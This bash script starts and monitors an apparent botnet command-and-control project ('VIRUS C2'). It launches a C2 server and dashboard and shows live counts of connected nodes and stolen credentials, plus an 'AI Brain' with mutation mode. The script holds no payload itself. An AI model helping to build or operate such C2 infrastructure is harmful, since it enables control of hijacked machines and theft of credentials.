#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
#  VIRUS C2 — TUI Startup Script
#  Starts both servers with animated bootstrap sequence and live status panel.
# ═══════════════════════════════════════════════════════════════════════════════

set -euo pipefail

C2_PID=""
FE_PID=""
SPINNER="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
SPIN_IDX=0

# ── Colors ──────────────────────────────────────────────────────────────────
G='\033[0;32m'      # green
C='\033[0;36m'      # cyan
Y='\033[0;33m'      # yellow
R='\033[0;31m'      # red
W='\033[0;37m'      # white
M='\033[0;35m'      # magenta
D='\033[0;90m'      # dim
B='\033[1m'         # bold
RST='\033[0m'
clear_line="\033[2K\r"

# ── Cleanup ─────────────────────────────────────────────────────────────────
cleanup() {
    echo ""
    echo -e "  ${D}──────────────────────────────────────────${RST}"
    echo -e "  ${Y}Shutting down...${RST}"
    [[ -n "$C2_PID" ]] && kill "$C2_PID" 2>/dev/null && echo -e "  ${G}✓${RST}  C2 server stopped (PID $C2_PID)"
    [[ -n "$FE_PID" ]] && kill "$FE_PID" 2>/dev/null && echo -e "  ${G}✓${RST}  Frontend stopped (PID $FE_PID)"
    echo -e "  ${D}Done.${RST}"
    echo ""
    tput cnorm 2>/dev/null || true
    exit 0
}
trap cleanup SIGINT SIGTERM

tput civis 2>/dev/null || true  # hide cursor

# ── Helpers ─────────────────────────────────────────────────────────────────
spin() {
    local msg="$1"
    SPIN_IDX=$(( (SPIN_IDX + 1) % ${#SPINNER} ))
    local c="${SPINNER:$SPIN_IDX:1}"
    printf "${clear_line}  ${C}${c}${RST}  ${msg}"
}

progress() {
    local current=$1
    local total=$2
    local label="${3:-}"
    local pct=$(( current * 100 / total ))
    local bar_width=24
    local filled=$(( pct * bar_width / 100 ))
    local empty=$(( bar_width - filled ))
    printf "${clear_line}  ${C}"
    for ((i=0; i<filled; i++)); do printf "█"; done
    printf "${D}"
    for ((i=0; i<empty; i++)); do printf "░"; done
    printf "${RST}  ${W}%3d%%${RST}  ${D}${label}${RST}" "$pct"
}

done_msg() {
    printf "${clear_line}  ${G}✓${RST}  %s\n" "$1"
}

fail_msg() {
    printf "${clear_line}  ${R}✗${RST}  %s\n" "$1"
}

info_msg() {
    printf "${clear_line}  ${D}%s${RST}\n" "$1"
}

# ── Safe Port Cleanup (only kill our servers, never the browser) ───────────
safe_kill_ports() {
    # Kill only python/uvicorn on port 8000
    local c2_pids
    c2_pids=$(ps aux | grep -E '[u]vicorn.*8000|[p]ython.*app:app' | awk '{print $2}' || true)
    if [[ -n "$c2_pids" ]]; then
        echo "$c2_pids" | xargs kill 2>/dev/null || true
        sleep 1
    fi

    # Kill only node/vite on port 3000 (NOT browser connections)
    local fe_pids
    fe_pids=$(ps aux | grep -E '[v]ite|[n]ode.*vite' | awk '{print $2}' || true)
    if [[ -n "$fe_pids" ]]; then
        echo "$fe_pids" | xargs kill 2>/dev/null || true
        sleep 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  ANIMATED ASCII TITLE – spells V I R U S letter by letter
# ═══════════════════════════════════════════════════════════════════════════════

clear
echo ""

# Build each letter of VIRUS as an array of 7-line strings
V=("${C}██    ██  ██${RST}"
   "${C} ██  ██   ██${RST}"
   "${C}  ██ ██   ██${RST}"
   "${C}  ██ ██   ██${RST}"
   "${C}   ███    ██${RST}"
   "${D}             ${RST}"
   "${D}             ${RST}")

I=("${C}███████${RST}"
   "${C}   ██   ${RST}"
   "${C}   ██   ${RST}"
   "${C}   ██   ${RST}"
   "${C}███████${RST}"
   "${D}       ${RST}"
   "${D}       ${RST}")

R=("${C}██████  ${RST}"
   "${C}██   ██ ${RST}"
   "${C}██████  ${RST}"
   "${C}██  ██  ${RST}"
   "${C}██   ██ ${RST}"
   "${D}        ${RST}"
   "${D}        ${RST}")

U=("${C}██   ██${RST}"
   "${C}██   ██${RST}"
   "${C}██   ██${RST}"
   "${C}██   ██${RST}"
   "${C} █████ ${RST}"
   "${D}       ${RST}"
   "${D}       ${RST}")

S=("${C} █████ ${RST}"
   "${C}██     ${RST}"
   "${C} █████ ${RST}"
   "${C}    ███${RST}"
   "${C}█████  ${RST}"
   "${D}       ${RST}"
   "${D}       ${RST}")

LETTERS=("V" "I" "R" "U" "S")
LETTER_DATA=("${V[@]}" "${I[@]}" "${R[@]}" "${U[@]}" "${S[@]}")

# Render the title area (7 lines + spacing)
render_frame() {
    local revealed="$1"  # how many letters are revealed (0-5)
    tput cup 0 0 2>/dev/null || true
    echo ""
    for line in 0 1 2 3 4 5 6; do
        printf "          "
        for i in 0 1 2 3 4; do
            if (( i < revealed )); then
                local name="${LETTERS[$i]}"
                local arr
                case $name in
                    V) arr=("${V[@]}");;
                    I) arr=("${I[@]}");;
                    R) arr=("${R[@]}");;
                    U) arr=("${U[@]}");;
                    S) arr=("${S[@]}");;
                esac
                printf "  %s" "${arr[$line]}"
            else
                printf "  ${D}░░░░░░░${RST}"
            fi
        done
        echo ""
    done
    echo ""
    if (( revealed < 5 )); then
        echo -e "          ${D}C2  COMMAND  &  CONTROL  SYSTEM${RST}"
    else
        echo -e "          ${G}C2  COMMAND  &  CONTROL  SYSTEM${RST}"
    fi
    echo ""
}

# Animate letters appearing
for step in 1 2 3 4 5; do
    clear
    render_frame $step
    sleep 0.25
done
sleep 0.3

echo -e "  ${D}──────────────────────────────────────────────────────${RST}"
echo ""

# ── Clean Ports (safe – only kills python/node, never browser) ────────────
spin "Cleaning stale server processes..."
safe_kill_ports
sleep 0.3
done_msg "Ports clear"

# ── Check Prerequisites ─────────────────────────────────────────────────────
ERRORS=0
V_PYTHON="/home/dysthemix/botnet/venv/bin/python"
PYTHON_BIN="${V_PYTHON}"
if [ ! -x "$PYTHON_BIN" ]; then PYTHON_BIN=$(command -v python3); fi
command -v python3 &>/dev/null || { fail_msg "Python3 not found"; ((ERRORS++)); }
command -v npm &>/dev/null || { fail_msg "npm not found"; ((ERRORS++)); }
test -d node_modules &>/dev/null || { fail_msg "node_modules not found (run npm install)"; ((ERRORS++)); }

if [[ $ERRORS -gt 0 ]]; then
    echo ""
    fail_msg "$ERRORS prerequisite(s) missing — aborting"
    tput cnorm 2>/dev/null || true
    exit 1
fi
sleep 0.2
done_msg "Prerequisites OK"
echo ""

# ── Start C2 Server ─────────────────────────────────────────────────────────
spin "Launching C2 server on :8000..."
cd /home/dysthemix/botnet
setsid "$PYTHON_BIN" -m uvicorn src.c2_server.app:app --host 0.0.0.0 --port 8000 > /tmp/c2server.log 2>&1 < /dev/null &
C2_PID=$!

# Wait for health check
for i in $(seq 1 20); do
    if curl -sf http://localhost:8000/health &>/dev/null; then
        break
    fi
    progress $i 15 "connecting..."
    sleep 0.4
done

if curl -sf http://localhost:8000/health &>/dev/null; then
    HEALTH=$(curl -sf http://localhost:8000/health 2>/dev/null || echo "{}")
    NODES=$(echo "$HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('nodes','?'))" 2>/dev/null || echo "?")
    CREDS=$(echo "$HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('creds','?'))" 2>/dev/null || echo "?")
    done_msg "C2 server online  —  ${G}${NODES}${RST} nodes  •  ${G}${CREDS}${RST} credentials"
else
    fail_msg "C2 server failed  —  check /tmp/c2server.log"
fi
echo ""

# ── Start Frontend ──────────────────────────────────────────────────────────
spin "Launching frontend on :3000..."
setsid npm run dev > /tmp/frontend.log 2>&1 < /dev/null &
FE_PID=$!

for i in $(seq 1 20); do
    if curl -sf http://localhost:3000 &>/dev/null; then
        break
    fi
    progress $i 15 "building..."
    sleep 0.4
done

if curl -sf http://localhost:3000 &>/dev/null; then
    done_msg "Frontend online  —  ${C}http://localhost:3000${RST}"
else
    fail_msg "Frontend failed  —  check /tmp/frontend.log"
fi

# ── Redis Check ─────────────────────────────────────────────────────────────
spin "Checking Redis..."
if redis-cli ping &>/dev/null 2>&1; then
    done_msg "Redis connected  —  ${G}ready${RST}"
else
    fail_msg "Redis offline  —  start with:  redis-server"
fi

# ── AI Brain Check ──────────────────────────────────────────────────────────
spin "Initializing AI Brain..."
sleep 0.5
if curl -sf http://localhost:8000/api/ai/context &>/dev/null 2>&1; then
    done_msg "AI Brain online  —  ${G}reasoning + monitor active${RST}"
else
    fail_msg "AI Brain offline"
fi

echo ""
echo -e "  ${C}┌───────────────────────────────────────────────┐${RST}"
echo -e "  ${C}│${RST}  ${B}${G}  ALL SYSTEMS OPERATIONAL${RST}                      ${C}│${RST}"
echo -e "  ${C}└───────────────────────────────────────────────┘${RST}"
echo ""
echo -e "  ${W}Dashboard${RST}   ${C}http://localhost:3000${RST}"
echo -e "  ${W}API${RST}         ${C}http://localhost:8000${RST}"
echo -e "  ${W}Health${RST}      ${C}http://localhost:8000/health${RST}"
echo -e "  ${W}Modules${RST}     ${C}http://localhost:8000/api/modules${RST}"
echo ""
echo -e "  ${D}C2 PID:${RST}     $C2_PID    ${D}Frontend PID:${RST}  $FE_PID"
echo -e "  ${D}Ctrl+C to stop${RST}"
echo ""
echo -e "  ${D}──────────────────────────────────────────────────────${RST}"
echo ""

# ── Live Status Loop ────────────────────────────────────────────────────────
STATUS_LINES=8
echo -e "  ${M}Live Status  ${D}(refreshes every 4s)${RST}"
echo ""

while true; do
    C2_NODES="?"
    C2_CREDS="?"
    C2_STATUS="${R}down${RST}"
    AI_STATUS="${D}off${RST}"
    SIM_STATUS="${D}off${RST}"
    MUT_MODE="${D}none${RST}"

    if curl -sf http://localhost:8000/health &>/dev/null; then
        HEALTH=$(curl -sf http://localhost:8000/health 2>/dev/null || echo "{}")
        C2_NODES=$(echo "$HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('nodes','?'))" 2>/dev/null || echo "?")
        C2_CREDS=$(echo "$HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('creds','?'))" 2>/dev/null || echo "?")
        C2_STATUS="${G}online${RST}"
    fi

    if curl -sf http://localhost:8000/api/ai/context &>/dev/null 2>&1; then
        AI_STATUS="${C}online${RST}"
    fi

    if curl -sf http://localhost:8000/api/simulation/status 2>/dev/null | grep -q "true"; then
        SIM_STATUS="${Y}active${RST}"
    fi

    # Get mutation mode
    if curl -sf http://localhost:8000/api/ai/context &>/dev/null 2>&1; then
        CTX=$(curl -sf http://localhost:8000/api/ai/context 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('active_nodes','0'))" 2>/dev/null || echo "0")
        if [[ "$CTX" -gt 0 ]]; then
            MUT_MODE="${G}ready${RST}"
        fi
    fi

    FE_STATUS="${R}down${RST}"
    if curl -sf http://localhost:3000 &>/dev/null; then
        FE_STATUS="${G}online${RST}"
    fi

    # Draw panel
    tput cup $(( $(tput lines 2>/dev/null || echo 40) - STATUS_LINES - 2 )) 0 2>/dev/null || true
    printf "\r\033[${STATUS_LINES}A"

    printf "  ${C}┌─────────────────────────────────────────────────────┐${RST}\n"
    printf "  ${C}│${RST}  C2 Server   ${W}:${RST}  ${C2_STATUS}   ${W}│${RST}  Nodes: ${G}%-4s${RST}   Creds: ${G}%-5s${RST}   ${C}│${RST}\n" "$C2_NODES" "$C2_CREDS"
    printf "  ${C}│${RST}  Frontend    ${W}:${RST}  ${FE_STATUS}   ${W}│${RST}  URL:   ${C}http://localhost:3000${RST}     ${C}│${RST}\n"
    printf "  ${C}│${RST}  AI Brain    ${W}:${RST}  ${AI_STATUS}   ${W}│${RST}  Mode:  ${MUT_MODE}                     ${C}│${RST}\n"
    printf "  ${C}│${RST}  Simulation  ${W}:${RST}  ${SIM_STATUS}   ${W}│${RST}  AI LLM: ${C}Featherless (HERTIC 9B)${RST}   ${C}│${RST}\n"
    printf "  ${C}│${RST}  Redis       ${W}:${RST}  ${G}connected${RST} ${W}│${RST}  Test:   ${C}python test_beacon.py${RST}     ${C}│${RST}\n"
    printf "  ${C}└─────────────────────────────────────────────────────┘${RST}\n"

    sleep 4
done
